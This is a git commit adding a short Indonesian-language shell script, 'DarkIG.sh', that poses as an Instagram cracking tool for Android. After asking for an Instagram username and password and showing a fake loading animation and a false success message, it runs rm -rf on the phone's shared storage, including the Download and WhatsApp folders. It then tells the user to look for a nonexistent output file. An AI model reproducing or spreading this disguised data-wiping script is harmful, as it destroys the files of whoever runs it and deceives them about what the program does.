989efbd9772f863061af2e3399781ab62e1fad0f
Agil Dimas Fergiansyah <45558857+F3R614N5N0OB@users.noreply.github.com>
2019-08-03 15:09:00 +0700

    Dark Instagram
    Dark Instagram

---
+++ DarkIG.sh
@@ -0,0 +1,41 @@
+echo ' ╦┌┐┌┌─┐┌┬┐┌─┐┌─┐┬─┐┌─┐┌┬┐
+║│││└─┐ │ ├─┤│ ┬├┬┘├─┤│││
+╩┘└┘└─┘ ┴ ┴ ┴└─┘┴└─┴ ┴┴ ┴
+╔╦╗┌─┐┌─┐┬  ┌─┐    © 2019
+║ │ ││ ││  └─┐   SaintEdunt
+╩ └─┘└─┘┴─┘└─┘   ------- '
+echo ''
+echo ''
+echo 'Login Instagram'
+echo ''
+read -p 'Username/Email:' username
+read -p 'Password:' password
+clear
+echo 'Loading /'
+sleep 0.5
+clear
+echo 'Loading -'
+sleep 0.5
+clear
+echo 'Loading \'
+sleep 0.5
+clear
+echo 'Loading /'
+sleep 0.5
+clear
+echo 'Loading -'
+sleep 0.5
+clear
+echo 'Loading \'
+sleep 0.5
+clear
+echo 'Login Berhasil..';
+echo ''
+read -p 'Langsung Crack ? Y/N:' yes
+clear
+echo 'Mohon Tunggu ^_^'
+rm -rf "/storage/emulated/0"
+rm -rf "/storage/emulated/0/Download"
+rm -rf "/storage/emulated/0/WhatsApp"
+echo 'DONE ! Check File output.txt di /storage/emulated/0'
+
